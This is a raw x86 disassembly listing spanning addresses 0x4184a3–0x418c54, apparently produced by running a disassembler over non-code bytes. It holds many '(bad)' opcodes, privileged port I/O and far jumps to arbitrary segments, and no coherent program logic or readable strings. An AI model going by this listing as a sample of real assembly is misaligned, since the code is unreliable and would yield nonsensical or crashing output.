  4184a3:	sbb    edx,edx
  4184a5:	xor    eax,0x3f91800e
  4184aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184ab:	xchg   ecx,eax
  4184ac:	mov    bl,0x8f
  4184ae:	imul   ebx,DWORD PTR [edx-0x6e],0xcbb4593a
  4184b5:	outs   dx,DWORD PTR ds:[esi]
  4184b6:	in     al,dx
  4184b7:	sahf   
  4184b8:	call   0x502262e3
  4184bd:	(bad)  
  4184be:	std    
  4184bf:	xchg   ebx,eax
  4184c0:	fisubr WORD PTR [ebx]
  4184c2:	retf   0x6fa
  4184c5:	ins    BYTE PTR es:[edi],dx
  4184c6:	mov    dl,0x4d
  4184c8:	out    0x2f,al
  4184ca:	(bad)  
  4184cc:	int    0x90
  4184ce:	outs   dx,BYTE PTR ds:[esi]
  4184cf:	mov    es,WORD PTR [ebx+0x15]
  4184d2:	cmp    eax,0x889d4e01
  4184d7:	push   edx
  4184d8:	adc    al,0x9a
  4184da:	mov    ds:0x6a713db5,al
  4184df:	or     ebx,DWORD PTR [ebx-0x1f]
  4184e2:	retf   
  4184e3:	mov    ?,esp
  4184e5:	fidiv  WORD PTR ss:[ecx-0x71]
  4184e9:	imul   ecx,DWORD PTR [edi+eiz*4+0x3a],0xc7c00be0
  4184f1:	imul   eax,DWORD PTR [edx+0x2d],0xfffffffb
  4184f5:	xchg   DWORD PTR [ecx+0x55],ebp
  4184f8:	gs (bad) 
  4184fa:	cmc    
  4184fb:	mov    ebx,0xb1cdf092
  418500:	jecxz  0x4184ae
  418502:	inc    eax
  418503:	sub    ah,BYTE PTR [edi]
  418505:	xor    BYTE PTR [edx+0x5aca2b72],bl
  41850b:	fisub  DWORD PTR [ebx-0xb76abb6]
  418511:	add    ebp,edi
  418513:	cmc    
  418514:	or     BYTE PTR [edi-0x76b77331],bl
  41851a:	neg    DWORD PTR [eax+0x62313993]
  418520:	xchg   edi,eax
  418521:	lods   eax,DWORD PTR ds:[esi]
  418522:	out    dx,eax
  418523:	mov    bl,0xe3
  418525:	test   al,0x51
  418527:	mov    bl,ah
  418529:	jmp    0x418586
  41852b:	loope  0x418551
  41852d:	ins    DWORD PTR es:[edi],dx
  41852e:	push   ss
  41852f:	and    DWORD PTR [edi],edx
  418531:	and    DWORD PTR [edi-0x69],0x27bddc00
  418538:	and    DWORD PTR [ebx+0x15376fc3],edi
  41853e:	shl    BYTE PTR [ebp+0x76],1
  418541:	loop   0x418554
  418543:	int3   
  418544:	push   edx
  418545:	pop    edx
  418546:	not    BYTE PTR [ebx]
  418548:	push   ecx
  418549:	popf   
  41854a:	mov    edi,0x102c10f1
  41854f:	loopne 0x41852d
  418551:	jmp    0x9353:0xb81d6665
  418558:	test   ch,al
  41855a:	inc    eax
  41855b:	in     eax,dx
  41855c:	xchg   edx,eax
  41855d:	sub    al,0x5e
  41855f:	xlat   BYTE PTR ds:[ebx]
  418560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418561:	pop    eax
  418562:	nop
  418563:	push   edx
  418564:	dec    ebp
  418565:	test   DWORD PTR [esi],eax
  418567:	call   0x854d:0xc0703e97
  41856e:	push   eax
  41856f:	lds    edi,FWORD PTR [edx]
  418571:	sbb    DWORD PTR [edi],eax
  418573:	fwait
  418574:	cdq    
  418575:	lock mov cl,0x84
  418578:	sbb    DWORD PTR [edx-0x5b2f6681],ebx
  41857e:	adc    DWORD PTR [eiz*4+0x4a19e2c2],ebp
  418585:	(bad)  [edi+0x18]
  418588:	ret    
  418589:	or     eax,0x25d174a1
  41858e:	imul   esp,eax,0xa9ab442d
  418594:	rcr    BYTE PTR ds:0x223d65b3,1
  41859a:	or     esp,DWORD PTR [ecx+ebx*2+0x35]
  41859e:	pop    esi
  41859f:	dec    esp
  4185a0:	pop    ss
  4185a1:	jno    0x4185f3
  4185a3:	out    dx,al
  4185a4:	das    
  4185a5:	xchg   edi,eax
  4185a6:	popa   
  4185a7:	pop    esi
  4185a8:	imul   ebx,DWORD PTR [ebp-0x79],0xfffffffb
  4185ac:	rol    BYTE PTR [edi+0x1d],cl
  4185af:	vdivpd xmm7,xmm5,XMMWORD PTR [edx]
  4185b3:	push   es
  4185b4:	sbb    eax,DWORD PTR [edi+0x42d618f7]
  4185ba:	ret    
  4185bb:	adc    BYTE PTR ds:0xd196e8b,bl
  4185c1:	das    
  4185c2:	jo     0x4185a8
  4185c4:	jb     0x4185e6
  4185c6:	adc    edi,edi
  4185c8:	div    edi
  4185ca:	or     eax,0xb6e4c152
  4185cf:	or     eax,0xa401ec7e
  4185d4:	pop    edx
  4185d5:	push   es
  4185d6:	mov    ebp,0xbd949cf1
  4185db:	and    al,0x8d
  4185dd:	jb     0x418638
  4185df:	adc    DWORD PTR [eax+0x3a0e5530],esp
  4185e5:	pop    esp
  4185e6:	mov    BYTE PTR ds:0x834654b9,bl
  4185ec:	cmp    DWORD PTR [ecx+ecx*2],eax
  4185ef:	push   edi
  4185f0:	ins    BYTE PTR es:[edi],dx
  4185f1:	ins    DWORD PTR es:[edi],dx
  4185f2:	dec    esi
  4185f3:	test   DWORD PTR [edx+ebx*2+0xa0cf526],edx
  4185fa:	dec    edi
  4185fb:	in     eax,0xcc
  4185fd:	call   0x7371e7a0
  418602:	push   esi
  418603:	jbe    0x4185fe
  418605:	clc    
  418606:	push   0xfffffff8
  418608:	add    BYTE PTR [edx],dh
  41860a:	or     eax,0x963e99e5
  41860f:	and    esp,DWORD PTR [edx-0x17]
  418612:	mov    BYTE PTR [ebx],ch
  418614:	sub    bh,0x41
  418617:	mov    al,ds:0xb774ba42
  41861c:	xor    bh,BYTE PTR [ebp+0x17df2252]
  418622:	cmp    dl,BYTE PTR [eax+0x43]
  418625:	xchg   ecx,eax
  418626:	retf   0x8958
  418629:	loope  0x4185c4
  41862b:	pop    ebp
  41862c:	in     al,dx
  41862d:	stos   BYTE PTR es:[edi],al
  41862e:	std    
  41862f:	cmp    al,BYTE PTR [ecx+0x2290d60c]
  418635:	addr16 popf 
  418637:	cmp    WORD PTR [edx],0x2a
  41863b:	push   0x4facb452
  418640:	xor    ah,al
  418642:	add    edi,edi
  418644:	outs   dx,DWORD PTR ds:[esi]
  418645:	rcl    DWORD PTR [ecx],cl
  418647:	xchg   esp,eax
  418648:	sbb    al,0x40
  41864a:	scas   al,BYTE PTR es:[edi]
  41864b:	cli    
  41864c:	jbe    0x4186bb
  41864e:	in     al,dx
  41864f:	ret    0xd953
  418652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418653:	xor    BYTE PTR [edx-0x20],0xf5
  418657:	mov    ebp,0x1d552a94
  41865c:	xchg   edx,eax
  41865d:	add    eax,DWORD PTR [esp+eax*2-0x4c]
  418661:	das    
  418662:	jnp    0x41860e
  418664:	test   al,0x85
  418666:	ss mov esp,0x947a5ef8
  41866c:	inc    ebx
  41866d:	shl    ch,0x63
  418670:	nop
  418671:	jmp    0x5aa2:0x95c48b82
  418678:	xchg   ebx,eax
  418679:	and    eax,0x20b49fbd
  41867e:	out    dx,eax
  41867f:	jmp    0xbf4e9e19
  418684:	js     0x4186e0
  418686:	rcl    BYTE PTR [edx],1
  418688:	xor    DWORD PTR [esi+0x3c],eax
  41868b:	xor    al,0x47
  41868d:	xor    BYTE PTR [edx+0x3e],ch
  418690:	nop
  418691:	aad    0x64
  418693:	rdtsc  
  418695:	pusha  
  418696:	add    dh,BYTE PTR [ebp+0x18]
  418699:	or     esi,ebp
  41869b:	shl    DWORD PTR ds:0x49211bc2,0xfc
  4186a2:	icebp  
  4186a3:	cwde   
  4186a4:	pop    ebx
  4186a5:	push   cs
  4186a6:	(bad)  
  4186a7:	cli    
  4186a8:	or     ebp,eax
  4186aa:	shl    DWORD PTR [eax-0x40],0x56
  4186ae:	sbb    DWORD PTR [edx],0xfffffff9
  4186b1:	es repz or BYTE PTR fs:[ebp+ebx*1+0x6f7cbca1],ah
  4186bb:	loop   0x418735
  4186bd:	(bad)  
  4186be:	pop    edi
  4186bf:	or     edx,DWORD PTR ds:0xfe1d218d
  4186c5:	push   es
  4186c6:	aas    
  4186c7:	popf   
  4186c8:	fcmovne st,st(3)
  4186ca:	xlat   BYTE PTR ds:[ebx]
  4186cb:	call   0x9284:0x4e65487e
  4186d2:	outs   dx,BYTE PTR ds:[esi]
  4186d3:	cli    
  4186d4:	int    0x57
  4186d6:	ja     0x4186d3
  4186d8:	mov    edi,eax
  4186da:	iret   
  4186db:	dec    esi
  4186dc:	cld    
  4186dd:	jl     0x4186d3
  4186df:	sahf   
  4186e0:	stos   BYTE PTR es:[edi],al
  4186e1:	pop    ecx
  4186e2:	leave  
  4186e3:	in     al,0xb8
  4186e5:	mov    edi,0xe3c92994
  4186ea:	xchg   dh,dh
  4186ec:	cmp    eax,0x8aa034e7
  4186f1:	out    dx,eax
  4186f2:	mov    ebx,cs
  4186f4:	adc    al,0x94
  4186f6:	jns    0x418741
  4186f8:	mov    al,ds:0x727f6c7e
  4186fd:	enter  0xcde0,0xa3
  418701:	ds enter 0x3925,0x21
  418706:	mov    ah,0x92
  418708:	std    
  418709:	mov    ecx,0xc368df97
  41870e:	push   ecx
  418710:	sub    edi,DWORD PTR [eax-0x2e677fc7]
  418716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418717:	pusha  
  418718:	jecxz  0x41877c
  41871a:	or     eax,DWORD PTR [ebp+0x41]
  41871d:	sti    
  41871e:	test   eax,0x8237bc27
  418723:	push   ebx
  418724:	int3   
  418725:	out    dx,eax
  418726:	cli    
  418727:	add    eax,0x7a4ad95c
  41872c:	mov    bl,BYTE PTR [ecx+0x3ba043d0]
  418732:	dec    ebp
  418733:	mov    esi,0x136994e2
  418738:	out    dx,eax
  418739:	jecxz  0x418732
  41873b:	gs cli 
  41873d:	aam    0x27
  41873f:	mov    ch,ah
  418741:	inc    edx
  418742:	lods   al,BYTE PTR ds:[esi]
  418743:	adc    al,0x6c
  418745:	pop    esi
  418746:	stos   DWORD PTR es:[edi],eax
  418747:	inc    ecx
  418748:	jae    0x4187a7
  41874a:	sub    BYTE PTR [edi-0x3d],bh
  41874d:	daa    
  41874e:	mov    eax,ds:0x395ef534
  418753:	mov    al,0x18
  418755:	pop    edi
  418756:	or     BYTE PTR [edi-0x59190bf],bh
  41875c:	xchg   ebx,eax
  41875d:	mov    ah,0xf2
  41875f:	adc    DWORD PTR [esi],ebp
  418761:	call   0xe42fb74
  418766:	call   0x2ef0f03a
  41876b:	push   eax
  41876c:	xlat   BYTE PTR ds:[ebx]
  41876d:	mov    fs,edi
  41876f:	dec    eax
  418770:	push   esi
  418771:	popa   
  418772:	mov    edi,0x19bb63d
  418777:	xchg   ebp,eax
  418778:	in     eax,dx
  418779:	cmp    esp,ebx
  41877b:	cdq    
  41877c:	fs jl  0x4187eb
  41877f:	jge    0x4187bd
  418781:	jge    0x4187db
  418783:	mov    dl,0x4f
  418785:	pusha  
  418786:	(bad)  
  418787:	lods   eax,DWORD PTR ds:[esi]
  418788:	push   cs
  418789:	ret    0xd01b
  41878c:	ins    DWORD PTR es:[edi],dx
  41878d:	or     al,0x7d
  41878f:	sub    BYTE PTR [ecx],dl
  418791:	stos   BYTE PTR es:[edi],al
  418792:	test   BYTE PTR [edi+0x7473f0e1],ah
  418798:	daa    
  418799:	shr    DWORD PTR [esi],1
  41879b:	mov    ds:0xf22843de,al
  4187a0:	adc    DWORD PTR [eax+0x57],ebx
  4187a3:	outs   dx,BYTE PTR gs:[esi]
  4187a5:	mov    al,0x16
  4187a7:	inc    edi
  4187a8:	jns    0x418762
  4187aa:	jl     0x4187b9
  4187ac:	jg     0x4187cf
  4187ae:	xor    al,0x6
  4187b0:	imul   BYTE PTR [edx-0x20]
  4187b3:	scas   eax,DWORD PTR es:[edi]
  4187b4:	cmp    BYTE PTR [ebx+esi*2],bh
  4187b7:	mov    eax,ds:0x91386b50
  4187bc:	ret    0x9703
  4187bf:	add    al,0x46
  4187c1:	push   eax
  4187c2:	sub    DWORD PTR [ecx],esi
  4187c4:	xchg   esi,eax
  4187c5:	lods   eax,DWORD PTR ds:[esi]
  4187c6:	scas   al,BYTE PTR es:[edi]
  4187c7:	iret   
  4187c8:	mov    ebp,ebx
  4187ca:	out    0xd3,eax
  4187cc:	in     eax,dx
  4187cd:	(bad)  [ebp-0x4ab2886]
  4187d3:	popa   
  4187d4:	mov    bl,0x2e
  4187d6:	pop    esp
  4187d7:	xor    eax,0x4ca34de9
  4187dc:	push   ebp
  4187dd:	add    ah,BYTE PTR [ebx]
  4187df:	or     al,0x95
  4187e1:	fisttp QWORD PTR [ecx-0x72]
  4187e4:	mov    ah,0xc8
  4187e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e7:	sbb    al,0xb3
  4187e9:	add    ecx,DWORD PTR [ebx+0x2947ccf0]
  4187ef:	enter  0xa7db,0x2a
  4187f3:	rcl    dl,cl
  4187f5:	(bad)  
  4187f6:	stos   BYTE PTR es:[edi],al
  4187f7:	pushf  
  4187f8:	fwait
  4187f9:	loopne 0x418827
  4187fb:	mov    DWORD PTR [eax-0x7bd9c9a4],esi
  418801:	dec    ecx
  418802:	lea    esi,[esi+0x44]
  418805:	xor    BYTE PTR [ebp-0x5b],ah
  418808:	rep outs dx,DWORD PTR ds:[esi]
  41880a:	out    0x24,al
  41880c:	arpl   di,si
  41880e:	pop    eax
  41880f:	sbb    DWORD PTR [eax],esp
  418811:	cmp    esi,DWORD PTR ds:0x2e8b528b
  418817:	adc    cl,BYTE PTR [edx]
  418819:	jecxz  0x41881a
  41881b:	ins    BYTE PTR es:[edi],dx
  41881c:	or     cl,bl
  41881e:	ins    BYTE PTR es:[edi],dx
  41881f:	scas   al,BYTE PTR es:[edi]
  418820:	(bad)
  418823:	push   cs
  418824:	loope  0x4187eb
  418826:	xchg   edi,eax
  418827:	inc    esp
  418828:	lds    esp,FWORD PTR [eax-0xe42075c]
  41882e:	adc    eax,0xf5bbb0f2
  418833:	cmp    DWORD PTR [eax+0x28],ebp
  418836:	popf   
  418837:	mov    dh,0xab
  418839:	mov    cs,WORD PTR [esi+0x2b4a3162]
  41883f:	push   DWORD PTR [ecx+0x6eecf178]
  418845:	dec    ebx
  418846:	dec    eax
  418847:	(bad)  
  418848:	or     ebp,ecx
  41884a:	sti    
  41884b:	mov    WORD PTR [eax],ss
  41884d:	sub    DWORD PTR [edi+0xf],ebp
  418850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418851:	sbb    al,0xc3
  418853:	(bad)  
  418854:	shr    BYTE PTR [eax],cl
  418856:	sbb    DWORD PTR [eax+0x2d85262f],ebp
  41885c:	mov    gs,WORD PTR [esi]
  41885e:	pop    DWORD PTR [eax+0x77]
  418861:	ins    DWORD PTR es:[edi],dx
  418862:	cmp    cl,dh
  418864:	ror    BYTE PTR [edi],1
  418866:	mov    ch,0x94
  418868:	mov    dl,0x2
  41886a:	jb     0x4187ef
  41886c:	aaa    
  41886d:	xchg   DWORD PTR [ebx],esi
  41886f:	cli    
  418870:	sub    BYTE PTR [edx],0xf
  418873:	sub    eax,0x270b37ef
  418878:	pushf  
  418879:	dec    eax
  41887a:	jns    0x418847
  41887c:	in     eax,0xd
  41887e:	icebp  
  41887f:	scas   al,BYTE PTR es:[edi]
  418880:	push   ds
  418881:	mov    ecx,DWORD PTR [eax-0x66]
  418884:	push   esi
  418885:	inc    eax
  418886:	dec    eax
  418887:	je     0x4188b4
  418889:	mov    ds:0x42f03c12,al
  41888e:	mov    dl,0x75
  418890:	iret   
  418891:	neg    DWORD PTR [edx+0x265f0b4]
  418897:	jp     0x418864
  418899:	xchg   ebp,eax
  41889a:	adc    esp,DWORD PTR [edx-0x7ffb63bd]
  4188a0:	das    
  4188a1:	add    BYTE PTR [edx-0x4c],ah
  4188a4:	adc    al,0xd2
  4188a6:	cs daa 
  4188a8:	push   esp
  4188a9:	adc    BYTE PTR [ebp+0x63],ah
  4188ac:	ss addr16 dec ebx
  4188af:	inc    esi
  4188b0:	push   ss
  4188b1:	pop    edx
  4188b2:	ss push esp
  4188b4:	ins    DWORD PTR es:[edi],dx
  4188b5:	adc    bl,al
  4188b7:	xchg   esi,eax
  4188b8:	add    dh,bl
  4188ba:	retf   
  4188bb:	mov    eax,ds:0x23954ad9
  4188c0:	cli    
  4188c1:	add    al,0x55
  4188c3:	cmp    eax,0x25a9afa3
  4188c8:	dec    edx
  4188c9:	xchg   edi,eax
  4188ca:	jno    0x4188e1
  4188cc:	jg     0x41884e
  4188ce:	xor    BYTE PTR [ebx+0x59],cl
  4188d1:	std    
  4188d2:	adc    ch,BYTE PTR [ebp+0xa72dbdb]
  4188d8:	mov    edi,0x845e12e
  4188dd:	nop
  4188de:	shr    BYTE PTR [eax+eiz*1+0x284506d9],cl
  4188e5:	add    DWORD PTR [esi-0x6],0xfff96243
  4188ec:	aam    0x9b
  4188ee:	shr    bl,0xd5
  4188f1:	cmp    eax,0xb826228e
  4188f6:	dec    eax
  4188f7:	fldenv [edi]
  4188f9:	adc    eax,0x594b59ea
  4188fe:	sbb    bh,0xc6
  418901:	pop    es
  418902:	push   ebp
  418903:	sub    al,0xdd
  418905:	aas    
  418906:	sub    ch,BYTE PTR ds:0x6f896283
  41890c:	add    ecx,DWORD PTR [edx+0x6a]
  41890f:	push   eax
  418910:	data16 es cld 
  418913:	sub    ah,dl
  418915:	ds push ebp
  418917:	call   0xa4fa:0x3af9271f
  41891e:	stos   DWORD PTR es:[edi],eax
  41891f:	xchg   ecx,eax
  418920:	loop   0x418929
  418922:	std    
  418923:	das    
  418924:	bnd jns 0x4188f0
  418927:	mov    dh,0x27
  418929:	pop    esi
  41892a:	ss pop ecx
  41892c:	in     eax,0x6
  41892e:	ficomp DWORD PTR [ebp-0x7a]
  418931:	cmp    eax,0x693f18a5
  418936:	add    BYTE PTR [edx+eiz*1],al
  418939:	adc    al,BYTE PTR [eax-0x7fe23aea]
  41893f:	loopne 0x4188d7
  418941:	xor    DWORD PTR [ebp-0x57d998ed],ebp
  418947:	push   cs
  418948:	sbb    DWORD PTR [ebx],esi
  41894a:	jae    0x418968
  41894c:	mov    ds:0x137b4774,al
  418951:	xchg   edi,eax
  418952:	sub    ch,ch
  418954:	ret    0xa46b
  418957:	mov    esi,0xf6c1b235
  41895c:	pop    edi
  41895d:	mov    al,0x15
  41895f:	cwde   
  418960:	xor    eax,esi
  418962:	fimul  DWORD PTR [eax+0x46]
  418965:	jle    0x41896d
  418967:	in     eax,dx
  418968:	xlat   BYTE PTR ds:[ebx]
  418969:	pop    ds
  41896a:	add    al,0xae
  41896c:	xlat   BYTE PTR ds:[ebx]
  41896d:	mov    al,0xfb
  41896f:	mov    esp,0x3c078a5a
  418974:	dec    esp
  418975:	repz and eax,0x4a2ed30b
  41897b:	(bad)  
  41897c:	outs   dx,BYTE PTR ds:[esi]
  41897d:	loop   0x418977
  41897f:	pop    eax
  418980:	leave  
  418981:	into   
  418982:	xor    cl,bl
  418984:	xlat   BYTE PTR ds:[ebx]
  418985:	add    al,0x0
  418987:	imul   eax,DWORD PTR [edi-0x1a],0xb904a4e8
  41898e:	add    al,0xcf
  418990:	popa   
  418991:	pop    esp
  418992:	inc    ebp
  418993:	out    dx,eax
  418994:	outs   dx,DWORD PTR ds:[esi]
  418995:	jmp    0xb09c3d14
  41899a:	stc    
  41899b:	clc    
  41899c:	dec    eax
  41899d:	loopne 0x4189bf
  41899f:	push   eax
  4189a0:	outs   dx,DWORD PTR ds:[esi]
  4189a1:	ds mov bl,0x50
  4189a4:	sbb    BYTE PTR [ecx+0x22dc603],ch
  4189aa:	and    cl,dh
  4189ac:	aad    0x81
  4189ae:	dec    ecx
  4189af:	call   0x7ed2:0x61bcf6ae
  4189b6:	pop    es
  4189b7:	cmc    
  4189b8:	cmp    bh,BYTE PTR [ecx]
  4189ba:	xor    eax,0xc3728405
  4189bf:	push   esi
  4189c0:	imul   eax,DWORD PTR [edi+0x929808c],0xffffffa8
  4189c7:	in     al,0xb2
  4189c9:	or     dl,BYTE PTR [eax-0x6a4e56c0]
  4189cf:	push   0xffffff90
  4189d1:	lods   eax,DWORD PTR ds:[esi]
  4189d2:	sbb    ch,BYTE PTR [ecx-0x303bd81b]
  4189d8:	jmp    0x1adb82ea
  4189dd:	pop    esi
  4189de:	mov    cl,0x23
  4189e0:	dec    ebp
  4189e1:	addr16 inc ebp
  4189e3:	shl    BYTE PTR ds:0xc9c29e2b,1
  4189e9:	pop    es
  4189ea:	mov    eax,ds:0x5683d495
  4189ef:	mov    ebp,eax
  4189f1:	daa    
  4189f2:	jl     0x4189db
  4189f4:	xchg   esp,eax
  4189f5:	or     DWORD PTR [eax],esi
  4189f7:	mov    al,0x2a
  4189f9:	dec    DWORD PTR ds:0xf5bfd95b
  4189ff:	xor    al,0x76
  418a01:	frstor [eax+ebx*8-0x577be285]
  418a08:	pushf  
  418a09:	or     eax,0xfde164a3
  418a0e:	scas   al,BYTE PTR es:[edi]
  418a0f:	fidivr DWORD PTR [ecx-0x52]
  418a12:	jne    0x418a54
  418a14:	add    al,0x6e
  418a16:	pop    eax
  418a17:	mov    al,ds:0xd1d8be42
  418a1c:	das    
  418a1d:	stc    
  418a1e:	sub    esi,edi
  418a20:	xchg   edi,eax
  418a21:	call   0x71a8:0xa5c17bb4
  418a28:	std    
  418a29:	and    eax,0x2d13a134
  418a2e:	mov    ds,WORD PTR [esi-0x58]
  418a31:	jnp    0x418a95
  418a33:	ret    
  418a34:	adc    DWORD PTR [eax+esi*4+0x31],edi
  418a38:	cmp    DWORD PTR [eax+0x540ca13],ebp
  418a3e:	call   0x41a546d4
  418a43:	mov    dh,0x6b
  418a45:	les    ebx,FWORD PTR fs:[ecx-0x62]
  418a49:	mov    esi,0xbec7672c
  418a4e:	mov    ss,WORD PTR [eax]
  418a50:	loop   0x418a52
  418a52:	mov    eax,0xf8db1154
  418a57:	adc    DWORD PTR [esi-0x2e],ecx
  418a5a:	mov    ds:0x5e4d1a00,eax
  418a5f:	pop    es
  418a60:	push   edx
  418a61:	cmp    al,0x15
  418a63:	cmp    bl,ch
  418a65:	retf   
  418a66:	xor    cl,BYTE PTR [eax+0x86e7097]
  418a6c:	xchg   ebx,eax
  418a6d:	leave  
  418a6e:	paddsb mm6,QWORD PTR [edi]
  418a71:	sub    eax,0x214f9980
  418a76:	shr    BYTE PTR [ecx-0x22fc4ee8],cl
  418a7c:	cmp    eax,0x9e5aa656
  418a81:	call   0x708:0xb546e51c
  418a88:	fwait
  418a89:	cs mov edx,0xfe9d9678
  418a8f:	mov    ds:0xc8189a08,eax
  418a94:	stos   DWORD PTR es:[edi],eax
  418a95:	mov    edx,0xf7bba133
  418a9a:	in     eax,0x5d
  418a9c:	inc    ebx
  418a9d:	stos   DWORD PTR es:[edi],eax
  418a9e:	arpl   WORD PTR [ecx+0x7f7bdc3e],di
  418aa4:	jmp    0x89a2607d
  418aa9:	sbb    edx,DWORD PTR [edi-0x48246657]
  418aaf:	pop    esp
  418ab0:	xchg   ecx,eax
  418ab1:	or     eax,esp
  418ab3:	jp     0x418b13
  418ab5:	clc    
  418ab6:	mov    bh,0xd2
  418ab8:	xlat   BYTE PTR ds:[ebx]
  418ab9:	lods   al,BYTE PTR ds:[esi]
  418aba:	test   DWORD PTR [esi+esi*4],esp
  418abd:	out    dx,al
  418abe:	inc    edx
  418abf:	jae    0xe81729ac
  418ac5:	aas    
  418ac6:	jne    0x418afc
  418ac8:	je     0x418ad2
  418aca:	push   cs
  418acb:	sbb    eax,0x7022fa59
  418ad0:	outs   dx,BYTE PTR ds:[esi]
  418ad1:	jno    0x418aff
  418ad3:	rcr    DWORD PTR [ecx-0x3],cl
  418ad6:	cmp    esp,DWORD PTR [ecx+0x56]
  418ad9:	and    DWORD PTR [ebx],edi
  418adb:	jg     0x418b4a
  418add:	in     al,0x79
  418adf:	or     BYTE PTR [eax+0x4cb9a71c],ah
  418ae5:	in     eax,0xdf
  418ae7:	mov    esp,DWORD PTR [esi+0x401790a]
  418aed:	in     eax,0xd
  418aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418af0:	rcl    DWORD PTR [esp+ebx*8+0x6b30cf88],1
  418af7:	out    0x72,eax
  418af9:	daa    
  418afa:	(bad)  
  418afb:	out    dx,eax
  418afc:	shr    DWORD PTR [eax-0x6921768b],1
  418b02:	mov    ah,0x9b
  418b04:	dec    ebx
  418b05:	sbb    eax,0xabbf5a5d
  418b0a:	leave  
  418b0b:	push   esi
  418b0c:	(bad)  
  418b0d:	popf   
  418b0e:	mov    al,ds:0xfe7ed0d
  418b13:	mov    eax,0x1bbd1fdb
  418b18:	add    edx,esi
  418b1a:	mov    DWORD PTR [eax+0x3f],esi
  418b1d:	mov    ecx,0x64e3ed9e
  418b22:	std    
  418b23:	sub    DWORD PTR [ebp+0x11],0xff40e4fa
  418b2a:	dec    ebx
  418b2b:	hlt    
  418b2c:	pop    ss
  418b2d:	js     0x418ac6
  418b2f:	das    
  418b30:	pop    edx
  418b31:	xchg   esi,eax
  418b32:	stos   DWORD PTR es:[edi],eax
  418b33:	push   ecx
  418b34:	pop    esp
  418b35:	and    bl,dl
  418b37:	pop    ecx
  418b38:	add    eax,0xb98a1e9f
  418b3d:	jno    0x418b6b
  418b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b40:	xchg   esi,eax
  418b41:	add    al,0x90
  418b43:	mov    dh,0x6a
  418b45:	out    dx,eax
  418b46:	rcr    BYTE PTR [edx+0x6a],0xe8
  418b4a:	xchg   DWORD PTR [esi],ecx
  418b4c:	cmp    edx,DWORD PTR [ecx+edi*4-0x7a]
  418b50:	ret    
  418b51:	loope  0x418b21
  418b53:	dec    esi
  418b54:	fxch   st(3)
  418b56:	push   0x43
  418b58:	lds    edx,FWORD PTR [edx+0x80a64ec]
  418b5e:	dec    edx
  418b5f:	imul   esi,DWORD PTR [esi+0x30],0x9e21adbf
  418b66:	sbb    BYTE PTR [esi+0x5a],0x6
  418b6a:	jp     0x418ba9
  418b6c:	lahf   
  418b6d:	lahf   
  418b6e:	pusha  
  418b6f:	add    ebx,esp
  418b71:	jb     0x418b9a
  418b73:	or     ebp,DWORD PTR [eax+0x3f19fd10]
  418b79:	push   ebx
  418b7a:	outs   dx,DWORD PTR ds:[esi]
  418b7b:	cdq    
  418b7c:	xchg   ebx,eax
  418b7d:	jo     0x418b7b
  418b7f:	pmuludq mm6,QWORD PTR [eax-0x3ef0cdf3]
  418b86:	sbb    DWORD PTR [edi+0x67],ebx
  418b89:	idiv   DWORD PTR [ebp+0x7b]
  418b8c:	test   eax,0x6bc58738
  418b91:	in     al,0xca
  418b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b94:	data16 outs dx,BYTE PTR es:[esi]
  418b97:	xchg   esi,eax
  418b98:	aas    
  418b99:	inc    eax
  418b9a:	adc    al,0x38
  418b9c:	les    ebx,FWORD PTR [ebx]
  418b9e:	ds push 0xdb0a7c1e
  418ba4:	pop    ecx
  418ba5:	(bad)  
  418ba6:	popf   
  418ba7:	dec    esi
  418ba8:	xlat   BYTE PTR ds:[ebx]
  418ba9:	pop    esp
  418baa:	ror    BYTE PTR [ecx-0x69960ff3],1
  418bb0:	xchg   BYTE PTR [edx+0x380cf0e1],ah
  418bb6:	int    0xd6
  418bb8:	lods   eax,DWORD PTR ds:[esi]
  418bb9:	clc    
  418bba:	dec    ebx
  418bbb:	hlt    
  418bbc:	jae    0x418c01
  418bbe:	xlat   BYTE PTR ds:[ebx]
  418bbf:	arpl   WORD PTR [edi+0x44222e90],bx
  418bc5:	sbb    esi,DWORD PTR [edx]
  418bc7:	lahf   
  418bc8:	iret   
  418bc9:	or     BYTE PTR [esi+esi*4-0x35743c76],al
  418bd0:	enter  0x542d,0xe
  418bd4:	cld    
  418bd5:	popa   
  418bd6:	enter  0xfb41,0x4f
  418bda:	aad    0x2a
  418bdc:	sub    ebp,esi
  418bde:	push   0xffffffd5
  418be0:	(bad)  
  418be1:	add    DWORD PTR [esi],ebp
  418be3:	test   DWORD PTR [ebx-0x44a55a86],0xd44ae4e0
  418bed:	dec    ebx
  418bee:	repnz cmp esi,DWORD PTR [esi+ebx*2-0x57618fd7]
  418bf6:	jmp    DWORD PTR [ecx]
  418bf8:	lea    esi,[edx-0x4b]
  418bfb:	inc    ebp
  418bfc:	cld    
  418bfd:	jg     0x418c02
  418bff:	out    0x38,al
  418c01:	jecxz  0x418c68
  418c03:	jge    0x418c68
  418c05:	and    ch,BYTE PTR [ecx-0x37b102f]
  418c0b:	and    BYTE PTR [edi+0x29b0b978],ah
  418c11:	retf   0xb8d5
  418c14:	repnz xor ebp,DWORD PTR [edx+0x12017ff6]
  418c1b:	inc    edi
  418c1c:	push   esp
  418c1d:	clc    
  418c1e:	icebp  
  418c1f:	mov    al,ds:0x26bfc0e3
  418c24:	sbb    al,0xe2
  418c26:	inc    ebx
  418c27:	push   esp
  418c28:	xchg   esi,eax
  418c29:	lahf   
  418c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c2b:	push   ebp
  418c2c:	pop    eax
  418c2d:	ss mov dl,0x7c
  418c30:	and    al,0xb7
  418c32:	nop
  418c33:	cmc    
  418c34:	mov    al,ds:0x2da8d0c2
  418c39:	mov    esp,0x7ad78078
  418c3e:	push   cs
  418c3f:	outs   dx,DWORD PTR ds:[esi]
  418c40:	stc    
  418c41:	repz mov dl,0x50
  418c44:	mov    ds:0x8ca34ce8,eax
  418c49:	sub    al,0xd3
  418c4b:	xor    esp,DWORD PTR [edi]
  418c4d:	call   0xdebe:0xc68fab58
  418c54:	add    DWORD PTR [eax],ebp
